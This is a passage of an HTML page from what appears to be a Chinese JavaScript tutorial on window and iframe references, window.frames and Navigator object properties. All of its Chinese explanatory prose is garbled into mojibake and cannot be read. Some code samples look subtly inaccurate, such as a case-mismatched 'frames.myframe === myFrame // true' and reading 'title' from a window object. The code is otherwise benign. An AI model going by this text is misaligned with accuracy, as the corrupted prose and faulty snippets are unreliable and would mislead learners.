ï¼ŒåµŒå…¥å…¶ä»–ç½‘é¡µï¼Œå› æ­¤ä¸€ä¸ªç½‘é¡µä¹‹ä¸­ä¼šå½¢æˆå¤šä¸ªçª—å£ã€‚å¦‚æœå­çª—å£ä¹‹ä¸­åˆåµŒå…¥åˆ«çš„ç½‘é¡µï¼Œå°±ä¼šå½¢æˆå¤šçº§çª—å£ã€‚</p> <h3 id="çª—å£çš„å¼•ç”¨"><a href="#çª—å£çš„å¼•ç”¨" class="header-anchor">#</a> çª—å£çš„å¼•ç”¨</h3> <p>å„ä¸ªçª—å£ä¹‹ä¸­çš„è„šæœ¬ï¼Œå¯ä»¥å¼•ç”¨å…¶ä»–çª—å£ã€‚æµè§ˆå™¨æä¾›äº†ä¸€äº›ç‰¹æ®Šå˜é‡ï¼Œç”¨æ¥è¿”å›å…¶ä»–çª—å£ã€‚</p> <ul><li><code>top</code>ï¼šé¡¶å±‚çª—å£ï¼Œå³æœ€ä¸Šå±‚çš„é‚£ä¸ªçª—å£</li> <li><code>parent</code>ï¼šçˆ¶çª—å£</li> <li><code>self</code>ï¼šå½“å‰çª—å£ï¼Œå³è‡ªèº«</li></ul> <p>ä¸‹é¢ä»£ç å¯ä»¥åˆ¤æ–­ï¼Œå½“å‰çª—å£æ˜¯å¦ä¸ºé¡¶å±‚çª—å£ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>top <span class="token operator">===</span> window<span class="token punctuation">.</span>self<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// å½“å‰çª—å£æ˜¯é¡¶å±‚çª—å£</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// å½“å‰çª—å£æ˜¯å­çª—å£</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸‹é¢çš„ä»£ç è®©çˆ¶çª—å£çš„è®¿é—®å†å²åé€€ä¸€æ¬¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸è¿™äº›å˜é‡å¯¹åº”ï¼Œæµè§ˆå™¨è¿˜æä¾›ä¸€äº›ç‰¹æ®Šçš„çª—å£åï¼Œä¾›<code>window.open()</code>æ–¹æ³•ã€<code>&lt;a&gt;</code>æ ‡ç­¾ã€<code>&lt;form&gt;</code>æ ‡ç­¾ç­‰å¼•ç”¨ã€‚</p> <ul><li><code>_top</code>ï¼šé¡¶å±‚çª—å£</li> <li><code>_parent</code>ï¼šçˆ¶çª—å£</li> <li><code>_blank</code>ï¼šæ–°çª—å£</li></ul> <p>ä¸‹é¢ä»£ç å°±è¡¨ç¤ºåœ¨é¡¶å±‚çª—å£æ‰“å¼€é“¾æ¥ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>somepage.html<span class="token punctuation">&quot;</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>_top<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Link<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="iframe-å…ƒç´ "><a href="#iframe-å…ƒç´ " class="header-anchor">#</a> iframe å…ƒç´ </h3> <p>å¯¹äº<code>iframe</code>åµŒå…¥çš„çª—å£ï¼Œ<code>document.getElementById</code>æ–¹æ³•å¯ä»¥æ‹¿åˆ°è¯¥çª—å£çš„ DOM èŠ‚ç‚¹ï¼Œç„¶åä½¿ç”¨<code>contentWindow</code>å±æ€§è·å¾—<code>iframe</code>èŠ‚ç‚¹åŒ…å«çš„<code>window</code>å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'theFrame'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> frameWindow <span class="token operator">=</span> frame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>frame.contentWindow</code>å¯ä»¥æ‹¿åˆ°å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚ç„¶åï¼Œåœ¨æ»¡è¶³åŒæºé™åˆ¶çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¯»å–å­çª—å£å†…éƒ¨çš„å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// è·å–å­çª—å£çš„æ ‡é¢˜</span>
frameWindow<span class="token punctuation">.</span>title

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><code>&lt;iframe&gt;</code>å…ƒç´ çš„<code>contentDocument</code>å±æ€§ï¼Œå¯ä»¥æ‹¿åˆ°å­çª—å£çš„<code>document</code>å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'theFrame'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> frameDoc <span class="token operator">=</span> frame<span class="token punctuation">.</span>contentDocument<span class="token punctuation">;</span>

<span class="token comment">// ç­‰åŒäº</span>
<span class="token keyword">var</span> frameDoc <span class="token operator">=</span> frame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><code>&lt;iframe&gt;</code>å…ƒç´ éµå®ˆåŒæºæ”¿ç­–ï¼Œåªæœ‰å½“çˆ¶çª—å£ä¸å­çª—å£åœ¨åŒä¸€ä¸ªåŸŸæ—¶ï¼Œä¸¤è€…ä¹‹é—´æ‰å¯ä»¥ç”¨è„šæœ¬é€šä¿¡ï¼Œå¦åˆ™åªæœ‰ä½¿ç”¨<code>window.postMessage</code>æ–¹æ³•ã€‚</p> <p><code>&lt;iframe&gt;</code>çª—å£å†…éƒ¨ï¼Œä½¿ç”¨<code>window.parent</code>å¼•ç”¨çˆ¶çª—å£ã€‚å¦‚æœå½“å‰é¡µé¢æ²¡æœ‰çˆ¶çª—å£ï¼Œåˆ™<code>window.parent</code>å±æ€§è¿”å›è‡ªèº«ã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡<code>window.parent</code>æ˜¯å¦ç­‰äº<code>window.self</code>ï¼Œåˆ¤æ–­å½“å‰çª—å£æ˜¯å¦ä¸º<code>iframe</code>çª—å£ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>parent <span class="token operator">!==</span> window<span class="token punctuation">.</span>self<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// å½“å‰çª—å£æ˜¯å­çª—å£</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><code>&lt;iframe&gt;</code>çª—å£çš„<code>window</code>å¯¹è±¡ï¼Œæœ‰ä¸€ä¸ª<code>frameElement</code>å±æ€§ï¼Œè¿”å›<code>&lt;iframe&gt;</code>åœ¨çˆ¶çª—å£ä¸­çš„ DOM èŠ‚ç‚¹ã€‚å¯¹äºéåµŒå…¥çš„çª—å£ï¼Œè¯¥å±æ€§ç­‰äº<code>null</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> f1Element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'f1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f1Window <span class="token operator">=</span> f1Element<span class="token punctuation">.</span>contentWindow<span class="token punctuation">;</span>

f1Window<span class="token punctuation">.</span>frameElement <span class="token operator">===</span> f1Element <span class="token comment">// true</span>
window<span class="token punctuation">.</span>frameElement <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token comment">// true</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="window-frames-å±æ€§"><a href="#window-frames-å±æ€§" class="header-anchor">#</a> window.frames å±æ€§</h3> <p><code>window.frames</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜æ˜¯æ‰€æœ‰å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼Œå®ç°çª—å£ä¹‹é—´çš„äº’ç›¸å¼•ç”¨ã€‚æ¯”å¦‚ï¼Œ<code>frames[0]</code>è¿”å›ç¬¬ä¸€ä¸ªå­çª—å£ï¼Œ<code>frames[1].frames[2]</code>è¿”å›ç¬¬äºŒä¸ªå­çª—å£å†…éƒ¨çš„ç¬¬ä¸‰ä¸ªå­çª—å£ï¼Œ<code>parent.frames[1]</code>è¿”å›çˆ¶çª—å£çš„ç¬¬äºŒä¸ªå­çª—å£ã€‚</p> <p>æ³¨æ„ï¼Œ<code>window.frames</code>æ¯ä¸ªæˆå‘˜çš„å€¼ï¼Œæ˜¯æ¡†æ¶å†…çš„çª—å£ï¼ˆå³æ¡†æ¶çš„<code>window</code>å¯¹è±¡ï¼‰ï¼Œè€Œä¸æ˜¯<code>iframe</code>æ ‡ç­¾åœ¨çˆ¶çª—å£çš„ DOM èŠ‚ç‚¹ã€‚å¦‚æœè¦è·å–æ¯ä¸ªæ¡†æ¶å†…éƒ¨çš„ DOM æ ‘ï¼Œéœ€è¦ä½¿ç”¨<code>window.frames[0].document</code>çš„å†™æ³•ã€‚</p> <p>å¦å¤–ï¼Œå¦‚æœ<code>&lt;iframe&gt;</code>å…ƒç´ è®¾ç½®äº†<code>name</code>æˆ–<code>id</code>å±æ€§ï¼Œé‚£ä¹ˆå±æ€§å€¼ä¼šè‡ªåŠ¨æˆä¸ºå…¨å±€å˜é‡ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡<code>window.frames</code>å±æ€§å¼•ç”¨ï¼Œè¿”å›å­çª—å£çš„<code>window</code>å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç ä¸º &lt;iframe id=&quot;myFrame&quot;&gt;</span>
window<span class="token punctuation">.</span>myFrame <span class="token comment">// [HTMLIFrameElement]</span>
frames<span class="token punctuation">.</span>myframe <span class="token operator">===</span> myFrame <span class="token comment">// true</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>å¦å¤–ï¼Œ<code>name</code>å±æ€§çš„å€¼ä¼šè‡ªåŠ¨æˆä¸ºå­çª—å£çš„åç§°ï¼Œå¯ä»¥ç”¨åœ¨<code>window.open</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ–è€…<code>&lt;a&gt;</code>å’Œ<code>&lt;frame&gt;</code>æ ‡ç­¾çš„<code>target</code>å±æ€§ã€‚</p> <h2 id="ä¸‰ã€navigator-å¯¹è±¡ï¼Œscreen-å¯¹è±¡ã€‚"><a href="#ä¸‰ã€navigator-å¯¹è±¡ï¼Œscreen-å¯¹è±¡ã€‚" class="header-anchor">#</a> ä¸‰ã€Navigator å¯¹è±¡ï¼ŒScreen å¯¹è±¡ã€‚</h2> <p><code>window.navigator</code>å±æ€§æŒ‡å‘ä¸€ä¸ªåŒ…å«æµè§ˆå™¨å’Œç³»ç»Ÿä¿¡æ¯çš„ Navigator å¯¹è±¡ã€‚è„šæœ¬é€šè¿‡è¿™ä¸ªå±æ€§äº†è§£ç”¨æˆ·çš„ç¯å¢ƒä¿¡æ¯ã€‚</p> <h2 id="_1-navigator-å¯¹è±¡çš„å±æ€§"><a href="#_1-navigator-å¯¹è±¡çš„å±æ€§" class="header-anchor">#</a> 1.Navigator å¯¹è±¡çš„å±æ€§</h2> <h3 id="navigator-useragent"><a href="#navigator-useragent" class="header-anchor">#</a> Navigator.userAgent</h3> <p><code>navigator.userAgent</code>å±æ€§è¿”å›æµè§ˆå™¨çš„ User Agent å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„å‚å•†å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚</p> <p>ä¸‹é¢æ˜¯ Chrome æµè§ˆå™¨çš„<code>userAgent</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>userAgent
<span class="token comment">// &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>é€šè¿‡<code>userAgent</code>å±æ€§è¯†åˆ«æµè§ˆå™¨ï¼Œä¸æ˜¯ä¸€ä¸ªå¥½åŠæ³•ã€‚å› ä¸ºå¿…é¡»è€ƒè™‘æ‰€æœ‰çš„æƒ…å†µï¼ˆä¸åŒçš„æµè§ˆå™¨ï¼Œä¸åŒçš„ç‰ˆæœ¬ï¼‰ï¼Œéå¸¸éº»çƒ¦ï¼Œè€Œä¸”ç”¨æˆ·å¯ä»¥æ”¹å˜è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²çš„æ ¼å¼å¹¶æ— ç»Ÿä¸€è§„å®šï¼Œä¹Ÿæ— æ³•ä¿è¯æœªæ¥çš„é€‚ç”¨æ€§ï¼Œå„ç§ä¸Šç½‘è®¾å¤‡å±‚å‡ºä¸ç©·ï¼Œéš¾ä»¥ç©·å°½ã€‚æ‰€ä»¥ï¼Œç°åœ¨ä¸€èˆ¬ä¸å†é€šè¿‡å®ƒè¯†åˆ«æµè§ˆå™¨äº†ï¼Œè€Œæ˜¯ä½¿ç”¨â€œåŠŸèƒ½è¯†åˆ«â€æ–¹æ³•ï¼Œå³é€ä¸€æµ‹è¯•å½“å‰æµè§ˆå™¨æ˜¯å¦æ”¯æŒè¦ç”¨åˆ°çš„ JavaScript åŠŸèƒ½ã€‚</p> <p>ä¸è¿‡ï¼Œé€šè¿‡<code>userAgent</code>å¯ä»¥å¤§è‡´å‡†ç¡®åœ°è¯†åˆ«æ‰‹æœºæµè§ˆå™¨ï¼Œæ–¹æ³•å°±æ˜¯æµ‹è¯•æ˜¯å¦åŒ…å«<code>mobi</code>å­—ç¬¦ä¸²ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> ua <span class="token operator">=</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/mobi/i</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>ua<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ‰‹æœºæµè§ˆå™¨</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// éæ‰‹æœºæµè§ˆå™¨</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>å¦‚æœæƒ³è¦è¯†åˆ«æ‰€æœ‰ç§»åŠ¨è®¾å¤‡çš„æµè§ˆå™¨ï¼Œå¯ä»¥æµ‹è¯•æ›´å¤šçš„ç‰¹å¾å­—ç¬¦ä¸²ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token regex">/mobi|android|touch|mini/i</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>ua<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="navigator-plugins"><a href="#navigator-plugins" class="header-anchor">#</a> Navigator.plugins</h3> <p><code>Navigator.plugins</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜æ˜¯ Plugin å®ä¾‹å¯¹è±¡ï¼Œè¡¨ç¤ºæµè§ˆå™¨å®‰è£…çš„æ’ä»¶ï¼Œæ¯”å¦‚ Flashã€ActiveX ç­‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> pluginsLength <span class="token operator">=</span> navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>length<span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pluginsLength<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="navigator-platform"><a href="#navigator-platform" class="header-anchor">#</a> Navigator.platform</h3> <p><code>Navigator.platform</code>å±æ€§è¿”å›ç”¨æˆ·çš„æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼Œæ¯”å¦‚<code>MacIntel</code>ã€<code>Win32</code>ã€<code>Linux x86_64</code>ç­‰ ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>platform
<span class="token comment">// &quot;Linux x86_64&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="navigator-online"><a href="#navigator-online" class="header-anchor">#</a> Navigator.onLine</h3> <p><code>navigator.onLine</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·å½“å‰åœ¨çº¿è¿˜æ˜¯ç¦»çº¿ï¼ˆæµè§ˆå™¨æ–­çº¿ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>onLine <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æœ‰æ—¶ï¼Œæµè§ˆå™¨å¯ä»¥è¿æ¥å±€åŸŸç½‘ï¼Œä½†æ˜¯å±€åŸŸç½‘ä¸èƒ½è¿é€šå¤–ç½‘ã€‚è¿™æ—¶ï¼Œæœ‰çš„æµè§ˆå™¨çš„<code>onLine</code>å±æ€§ä¼šè¿”å›<code>true</code>ï¼Œæ‰€ä»¥ä¸èƒ½å‡å®šåªè¦æ˜¯<code>true</code>ï¼Œç”¨æˆ·å°±ä¸€å®šèƒ½è®¿é—®äº’è”ç½‘ã€‚ä¸è¿‡ï¼Œå¦‚æœæ˜¯<code>false</code>ï¼Œå¯ä»¥æ–­å®šç”¨æˆ·ä¸€å®šç¦»çº¿ã€‚</p> <p>ç”¨æˆ·å˜æˆåœ¨çº¿ä¼šè§¦å‘<code>online</code>äº‹ä»¶ï¼Œå˜æˆç¦»çº¿ä¼šè§¦å‘<code>offline</code>äº‹ä»¶ï¼Œå¯ä»¥é€šè¿‡<code>window.ononline</code>å’Œ<code>window.onoffline</code>æŒ‡å®šè¿™ä¸¤ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'offline'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'offline'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'online'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'online'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="navigator-languageï¼Œnavigator-languages"><a href="#navigator-languageï¼Œnavigator-languages" class="header-anchor">#</a> Navigator.languageï¼ŒNavigator.languages</h3> <p><code>Navigator.language</code>å±æ€§è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„é¦–é€‰è¯­è¨€ã€‚è¯¥å±æ€§åªè¯»ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>language <span class="token comment">// &quot;en&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>Navigator.languages</code>å±æ€§è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¡¨ç¤ºç”¨æˆ·å¯ä»¥æ¥å—çš„è¯­è¨€ã€‚<code>Navigator.language</code>æ€»æ˜¯è¿™ä¸ªæ•°ç»„çš„ç¬¬ä¸€ä¸ªæˆå‘˜ã€‚HTTP è¯·æ±‚å¤´ä¿¡æ¯çš„<code>Accept-Language</code>å­—æ®µï¼Œå°±æ¥è‡ªè¿™ä¸ªæ•°ç»„ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>languages  <span class="token comment">// [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å¦‚æœè¿™ä¸ªå±æ€§å‘ç”Ÿå˜åŒ–ï¼Œå°±ä¼šåœ¨<code>window</code>å¯¹è±¡ä¸Šè§¦å‘<code>languagechange</code>äº‹ä»¶ã€‚</p> <h3 id="navigator-geolocation"><a href="#navigator-geolocation" class="header-anchor">#</a> Navigator.geolocation</h3> <p><code>Navigator.geolocation</code>å±æ€§è¿”å›ä¸€ä¸ª Geolocation å¯¹è±¡ï¼ŒåŒ…å«ç”¨æˆ·åœ°ç†ä½ç½®çš„ä¿¡æ¯ã€‚æ³¨æ„ï¼Œè¯¥ API åªæœ‰åœ¨ HTTPS åè®®ä¸‹å¯ç”¨ï¼Œå¦åˆ™è°ƒç”¨ä¸‹é¢æ–¹æ³•æ—¶ä¼šæŠ¥é”™ã€‚</p> <p>Geolocation å¯¹è±¡æä¾›ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•ã€‚</p> <ul><li>Geolocation.getCurrentPosition()ï¼šå¾—åˆ°ç”¨æˆ·çš„å½“å‰ä½ç½®</li> <li>Geolocation.watchPosition()ï¼šç›‘å¬ç”¨æˆ·ä½ç½®å˜åŒ–</li> <li>Geolocation.clearWatch()ï¼šå–æ¶ˆ<code>watchPosition()</code>æ–¹æ³•æŒ‡å®šçš„ç›‘å¬å‡½æ•°</li></ul> <p>æ³¨æ„ï¼Œè°ƒç”¨è¿™ä¸‰ä¸ªæ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œè¦æ±‚ç”¨æˆ·ç»™äºˆæˆæƒã€‚</p> <h3 id="navigator-cookieenabled"><a href="#navigator-cookieenabled" class="header-anchor">#</a> Navigator.cookieEnabled</h3> <p><code>Navigator.cookieEnabled</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„ Cookie åŠŸèƒ½æ˜¯å¦æ‰“å¼€ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span>cookieEnabled <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§åæ˜ çš„æ˜¯æµè§ˆå™¨æ€»çš„ç‰¹æ€§ï¼Œä¸æ˜¯å¦å‚¨å­˜æŸä¸ªå…·ä½“çš„ç½‘ç«™çš„ Cookie æ— å…³ã€‚ç”¨æˆ·å¯ä»¥è®¾ç½®æŸä¸ªç½‘ç«™ä¸å¾—å‚¨å­˜ Cookieï¼Œè¿™æ—¶<code>cookieEnabled</code>è¿”å›çš„è¿˜æ˜¯<code>true</code>ã€‚</p> <h2 id="_2-navigator-å¯¹è±¡çš„æ–¹æ³•"><a href="#_2-navigator-å¯¹è±¡çš„æ–¹æ³•" class="header-anchor">#</a> 2.Navigator å¯¹è±¡çš„æ–¹æ³•</h2> <h3 id="navigator-javaenabled"><a href="#navigator-javaenabled" class="header-anchor">#</a> Navigator.javaEnabled()</h3> <p><code>Navigator.javaEnabled()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦èƒ½è¿è¡Œ Java Applet å°ç¨‹åºã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span><span class="token function">javaEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// false</span>
